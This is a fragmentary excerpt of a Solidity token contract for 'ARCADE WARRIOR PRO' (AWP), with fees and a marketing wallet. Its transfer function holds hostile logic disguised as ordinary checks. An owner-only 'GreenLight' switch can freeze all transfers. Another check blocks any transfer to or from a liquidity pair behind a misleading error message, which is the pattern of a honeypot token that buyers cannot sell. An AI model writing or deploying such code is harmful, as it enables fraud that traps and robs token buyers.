...
// Telegram: 
// Website : https://arcadewarrior.pro/
...
contract AWP is Context, IERC20, Ownable {
    ...
    string private constant _name = "ARCADE WARRIOR PRO"; // 
    string private constant _symbol = "AWP"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 7;
    uint256 public _liquidityFee = 2;
    address public  _marketingWallet = 0x441CAF6C8C970E4fB58EC53f15d5B0F1abA938dD;
	...
	function GreenLightStatus(bool newColor) public onlyOwner {
        GreenLight = newColor;
    }
    ...
    function _transfer(
        ...
        require(GreenLight, "Red Light Means Stop");
		require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
		require(!isLiquidityPair[from] && !isLiquidityPair[to], "Unable to locate corresponding TransferEventLOGS");
